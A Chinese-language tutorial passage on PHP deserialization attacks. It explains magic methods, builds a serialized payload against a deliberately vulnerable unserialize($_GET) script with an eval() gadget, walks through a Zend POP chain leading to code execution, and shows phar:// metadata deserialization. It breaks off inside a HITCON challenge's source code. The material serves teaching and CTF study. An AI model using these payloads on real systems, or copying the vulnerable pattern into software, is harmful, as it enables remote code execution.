+<h2 id="0X03-PHP-反序列化漏洞"><a href="#0X03-PHP-反序列化漏洞" class="headerlink" title="0X03 PHP 反序列化漏洞"></a><strong>0X03 PHP 反序列化漏洞</strong></h2><h3 id="1-概念解释："><a href="#1-概念解释：" class="headerlink" title="1.概念解释："></a><strong>1.概念解释：</strong></h3><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，我觉得这个表达很不直白，也不能说明根本的问题，不如我们叫他 PHP 对象的属性篡改漏洞好了(别说这是我说的~~)</p>
+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
+<h3 id="2-必须知道的魔法方法："><a href="#2-必须知道的魔法方法：" class="headerlink" title="2.必须知道的魔法方法："></a><strong>2.必须知道的魔法方法：</strong></h3><p>这里就不得不介绍几个我们必须知道的魔法方法了</p>
+<p>(1)<strong>construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。(2)</strong>wakeup() ：unserialize()时会自动调用<br>(3)<strong>destruct()：当对象被销毁时会自动调用。(4)</strong>toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(5)<strong>get() :当从不可访问的属性读取数据(6)</strong>call(): 在对象上下文中调用不可访问的方法时触发<br><strong>其中我想特别说明一下第四点：</strong></p>
+<p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p>
+<blockquote>
+<p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p>
+<p>(2)反序列化对象与字符串连接时</p>
+<p>(3)反序列化对象参与格式化字符串时</p>
+<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
+<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
+<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
+<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p>
+<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
+</blockquote>
+<h3 id="3-为什么要提到这些魔法方法"><a href="#3-为什么要提到这些魔法方法" class="headerlink" title="3.为什么要提到这些魔法方法"></a><strong>3.为什么要提到这些魔法方法</strong></h3><p>为什么要提到这些魔法方法？你看你上面的实现的最简单的攻击不是也没有用到魔法方法吗，我想肯定有人要问这个问题，我曾经也问过自己这个问题。</p>
+<p>我们上面讲过，在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，<strong>我们就能传入任何的已经序列化的对象</strong>（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p>
+<p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p>
+<p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p>
+<h3 id="4-调用魔法方法的例子"><a href="#4-调用魔法方法的例子" class="headerlink" title="4.调用魔法方法的例子"></a><strong>4.调用魔法方法的例子</strong></h3><p>说那么多，我们来看一个反序列化的案例，加强一下我们对这个魔法方法的理解吧</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95.png" alt="此处输入图片的描述"></a></p>
+<p><strong>测试的结果：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt="此处输入图片的描述"></a></p>
+<p>读者可以按照我上面说的魔法方法的触发规则分析一下这个结果是怎么来的，我就不详细分析了，也比较简单，就是提示一下这里 __destruct 了两次说明当前实际上有两个对象，一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
+<h3 id="5-利用魔法方法发起攻击"><a href="#5-利用魔法方法发起攻击" class="headerlink" title="5.利用魔法方法发起攻击"></a><strong>5.利用魔法方法发起攻击</strong></h3><p><strong>测试代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $K0rz3n = <span class="string">"i am K0rz3n"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> L();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to XDSEC"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>我们先来分析一下这段代码，首先我们能看到 unserialize() 函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现<strong>他有一个魔法函数 __destruct()</strong> ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定<strong>反序列化这个类的对象了</strong>，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击)</p>
+<p>那我们看一下哪些属性的控制是对我们有用的(这个时候我们就跳过了<strong>construct() 方法，毕竟他永远不会被调用)，因为这个例子比较简单，</strong>destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，<strong>我们需要将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象</strong>，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性，将其改成我们的 Payload</p>
+<p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(当然你愿意我也不拦着你，理论上是可行的)，我们要将这段代码复制一下，然后修改一些内容并进行序列化操作</p>
+<p><strong>生成 payload 代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Evil;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$K0rz3n = <span class="keyword">new</span> K0rz3n;</span><br><span class="line">$data = serialize($K0rz3n);</span><br><span class="line">file_put_contents(<span class="string">"seria.txt"</span>, $data);</span><br></pre></td></tr></table></figure>
+
+<p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，想刚刚的代码发起请求</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvps0cgkkj211h0ex40y.jpg" alt></p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB1.png" alt="此处输入图片的描述"></a></p>
+<p>可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中绝对不能忘掉</p>
+<p><strong>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者说流程</strong></p>
+<p>(1)寻找 unserialize() 函数的参数是否有我们的可控点<br>(2)寻找我们的反序列化的目标，重点寻找 存在 <strong>wakeup() 或</strong> destruct() 魔法函数的类<br>(3)<strong>一层一层</strong>地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的<br>(4)找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击</p>
+<h2 id="0X04-POP-链的介绍"><a href="#0X04-POP-链的介绍" class="headerlink" title="0X04 POP 链的介绍"></a><strong>0X04 POP 链的介绍</strong></h2><p>玩过 pwn 的同学应该对 ROP 并不陌生，ROP 的全称是面向返回编程(Return-Oriented Programing),ROP 链构造中是寻找<strong>当前系统环境中</strong>或者<strong>内存环境里已经存在的</strong>、具有固定地址且带有返回操作的指令集,将这些<strong>本来无害的片段</strong>拼接起来，形成一个连续的层层递进的调用链，最终达到我们的执行 libc 中函数或者是 systemcall 的目的</p>
+<p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p>
+<p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p>
+<p><strong>说了这么多理论了，来点实战性的东西演示一下 POP 链的形成吧！</strong></p>
+<h3 id="1-POP-链实战"><a href="#1-POP-链实战" class="headerlink" title="1.POP 链实战"></a><strong>1.POP 链实战</strong></h3><p>整个代码片段我将以图片的形式展现，有兴趣的读者请先自己分析，之后在看我的分析，<strong>当然这个案例里面似乎少了比较关键的 unserialize() 函数，那我们就假设这个 unserialize() 在我们的第一张图片的里面，并且参数完全可控</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%981.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%981.png" alt="此处输入图片的描述"></a></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%982.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%982.png" alt="此处输入图片的描述"></a></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%983.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%983.png" alt="此处输入图片的描述"></a></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%984.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%984.png" alt="此处输入图片的描述"></a></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%985.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%985.png" alt="此处输入图片的描述"></a></p>
+<p>现在我们就按照，我上面说的步骤来一步一步的分析这段代码，最终构造我们的 POP 链完成利用</p>
+<p><strong>(1)寻找 unserialize() 函数的参数是否有我们的可控点</strong></p>
+<p>这个我上面说了，我们假设已经在第一段代码里设置了参数可控的 unserialize() ，所以这一步就可以跳过</p>
+<p><strong>(2)寻找我们的反序列化的目标，重点寻找 存在 wakeup() 或 destruct() 魔法函数的类</strong></p>
+<p>我们在第一段代码中寻找，我们发现一眼就看到了我们最想要看到的东西，__destruct() 魔法方法，好，既然这样我们就将这个类作为我们的漏洞嫌疑对象</p>
+<p><strong>(3)一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</strong></p>
+<p>1.我们就先来看一下这个 <code>$write</code> ，这个 <code>$write</code> 虽然不是属性，但是他是我们 <code>$_write</code> 属性的其中一部分，那么控制他也就等于控制属性，那我们就要好好研究一下这个 $write 了，他是什么呢？通过他能调用 shutdown() 来看,他是某一个类的一个对象，因为他不是单纯的属性所以我们还要向下挖</p>
+<p>2.于是我们就要找一下定义 shutdown() 方法的类，然后我们就锁定了 Zend_Log_Writer_Mail 这个类，我们看到这个类里面使用了 $write 对象的很多属性，比如说 _layout ，然后我们又发现这个属性也调用了一个方法 render() ，说明这个属性其实也是一个对象，于是我们还要向更深处挖掘</p>
+<p>3.那么 _layout 是谁的对象呢？我们发现他是 Zend_layout 的一个对象，同样的，他里面是用了一个 _inflector 的属性，这个属性调用了 filter 方法，看来他也是一个对象（有完没完~~）别急，我们继续向下</p>
+<p>4.我们发现 _inflector 是 Zend_Filter_PregReplace 的一个对象，这个对象的一些属性是能进行直接控制的，并且在调用 filter 方法的时候能直接触发 preg_replace() 方法，太好了这正是我们想要的，我们只要控制这个对象的属性就能实现我们的利用链</p>
+<p>最后一张 图片实际上已经将整个利用链画了出来，并且给上了 payload ，下面我想通过对整个 payload 的分析再来回顾一下整个 POP 链的调用过程</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%E9%93%BE%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%E9%93%BE%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90.png" alt="此处输入图片的描述"></a></p>
+<p>所以整个 POP 链就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">writer-&gt;shutdown()-&gt;render()-&gt;filter()-&gt;preg_replace(我们控制的属性)-&gt;代码执行</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>声明：</strong><br>当然这是一个很老的但是很经典的例子，里面用到的方法还是 preg_replace() 的 /e 选项，我们只是学习使用，请大家不要纠结</p>
+</blockquote>
+<h2 id="0X05-利用-phar-拓展-PHP-反序列化的攻击面"><a href="#0X05-利用-phar-拓展-PHP-反序列化的攻击面" class="headerlink" title="0X05 利用 phar:// 拓展 PHP 反序列化的攻击面"></a><strong>0X05 利用 phar:// 拓展 PHP 反序列化的攻击面</strong></h2><p>在 2017 年的 hitcon Orange 的一道 0day 题的解法令人震惊，Orange 通过他对底层的深度理解，为 PHP 反序列化开启了新的篇章，在此之后的 black 2018 演讲者同样用这个话题讲述了 phar:// 协议在 PHP 反序列化中的神奇利用，那么接下来就让我们分析他为什么开启了 PHP 反序列化的新世界,以及剖析一下这个他的利用方法。</p>
+<h3 id="1-回顾一下原先-PHP-反序列化攻击的必要条件"><a href="#1-回顾一下原先-PHP-反序列化攻击的必要条件" class="headerlink" title="1.回顾一下原先 PHP 反序列化攻击的必要条件"></a><strong>1.回顾一下原先 PHP 反序列化攻击的必要条件</strong></h3><p>(1)首先我们必须有 unserailize() 函数<br>(2)unserailize() 函数的参数必须可控</p>
+<p>这两个是原先存在 PHP 反序列化漏洞的必要条件，没有这两个条件你谈都不要谈，根本不可能，但是从2017 年开始 Orange 告诉我们是可以的</p>
+<h3 id="2-phar-如何扩展反序列化的攻击面的"><a href="#2-phar-如何扩展反序列化的攻击面的" class="headerlink" title="2.phar:// 如何扩展反序列化的攻击面的"></a><strong>2.phar:// 如何扩展反序列化的攻击面的</strong></h3><p>原来 phar 文件包在 生成时会以序列化的形式存储用户自定义的 meta-data ，配合 phar:// 我们就能在文件系统函数 file_exists() is_dir() 等参数可控的情况下实现自动的反序列化操作，于是我们就能通过构造精心设计的 phar 包在没有 unserailize() 的情况下实现反序列化攻击，从而将 PHP 反序列化漏洞的触发条件大大拓宽了，降低了我们 PHP 反序列化的攻击起点。</p>
+<h3 id="3-具体解释一下-phar-的使用"><a href="#3-具体解释一下-phar-的使用" class="headerlink" title="3.具体解释一下 phar 的使用"></a><strong>3.具体解释一下 phar 的使用</strong></h3><h4 id="1-Phar-的文件结构"><a href="#1-Phar-的文件结构" class="headerlink" title="1.Phar 的文件结构"></a><strong>1.Phar 的文件结构</strong></h4><p>phar 文件最核心也是必须要有的部分如图所示：</p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png" alt="此处输入图片的描述"></a></p>
+<p><strong>(1) a stub</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png" alt="此处输入图片的描述"></a></p>
+<p>图片中说了，这其实就是一个PHP 文件实际上我们能将其复杂化为下面这个样子</p>
+<p><strong>格式为:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件</p>
+<p><strong>(2）a manifest describing the contents</strong></p>
+<p>因为 Phar 本身就是一个压缩文件，它里面存储着其中每个被压缩文件的权限、属性等信息。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png" alt="此处输入图片的描述"></a></p>
+<p><strong>(3)the file contents</strong></p>
+<p>这部分就是我们想要压缩在 phar 压缩包内部的文件</p>
+<h4 id="2-如何创建一个合法的-Phar压缩文件"><a href="#2-如何创建一个合法的-Phar压缩文件" class="headerlink" title="2.如何创建一个合法的 Phar压缩文件"></a><strong>2.如何创建一个合法的 Phar压缩文件</strong></h4><p><strong>示例代码：</strong></p>
+<p><strong>(1) a stub</strong></p>
+<p><strong>(2）a manifest describing the contents</strong></p>
+<p><strong>(3)the file contents</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line"></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为不是文本文件，我们使用 hexdump 看一下文件的内容</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.png" alt="此处输入图片的描述"></a></p>
+<p>可以清楚地看到我们的 TestObject 类已经以序列化的形式存入文件中</p>
+<p>我们刚刚说过了，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化</p>
+<p><strong>测试后受影响的函数如下：</strong></p>
+<table>
+<thead>
+<tr>
+<th>受影响的函数列表</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fileatime</td>
+<td>filectime</td>
+<td>file_exists</td>
+<td>file_get_contents</td>
+</tr>
+<tr>
+<td>file_put_contents</td>
+<td>file</td>
+<td>filegroup</td>
+<td>fopen</td>
+</tr>
+<tr>
+<td>fileinode</td>
+<td>filemtime</td>
+<td>fileowner</td>
+<td>fikeperms</td>
+</tr>
+<tr>
+<td>is_dir</td>
+<td>is_executable</td>
+<td>is_file</td>
+<td>is_link</td>
+</tr>
+<tr>
+<td>is_readable</td>
+<td>is_writable</td>
+<td>is_writeable</td>
+<td>parse_ini_file</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>unlink</td>
+<td>stat</td>
+<td>readfile</td>
+</tr>
+</tbody></table>
+<h4 id="3-phar-反序列化小实验"><a href="#3-phar-反序列化小实验" class="headerlink" title="3.phar 反序列化小实验"></a><strong>3.phar 反序列化小实验</strong></h4><p>我们来做一个小测试看一下是不是真的和说的一样会反序列化</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line">    file_get_contents($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>结果如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F.png" alt="此处输入图片的描述"></a></p>
+<p>可以看出我们成功的在没有 unserailize() 函数的情况下，通过精心构造的 phar 文件，再结合 phar:// 协议，配合文件系统函数，实现了一次精彩的反序列化操作。</p>
+<h4 id="4-phar-的实战"><a href="#4-phar-的实战" class="headerlink" title="4.phar 的实战"></a><strong>4.phar 的实战</strong></h4><p>这一部分的内容我打算使用 Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化，毕竟这是第一次出现这种利用方式的地方，应该来说是最经典的利用场景</p>
+<p><strong>题目源码如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $FLAG    = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">	<span class="comment">// 得到 flag 的匿名函数</span></span><br><span class="line">    $SECRET  = `/read_secret`;</span><br><span class="line">    